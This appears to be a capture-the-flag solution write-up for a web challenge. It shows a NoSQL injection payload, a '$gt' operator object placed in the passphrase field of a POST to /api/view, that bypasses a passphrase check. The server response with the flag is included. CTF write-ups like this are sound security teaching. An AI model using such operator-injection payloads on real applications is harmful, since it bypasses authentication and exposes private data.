# Solution

A simple NoSQL Injection through an unsanitized field `passphrase`.

This bypasses the requirement of a secret passphrase to access the note.

POST `/api/view`
```json
{
  "id": "5",
  "passphrase": {
    "$gt": ""
  }
}
```
```json
{
  "title": "CONFIDENTIAL NOTE",
  "content": "Here is the secret flag, do not share it with anyone!\nSPARK{n0_sQLi_EXp3ri3n2E?}"
}
```

> [!note]
> Do note that the ID changes everytime the server reloads.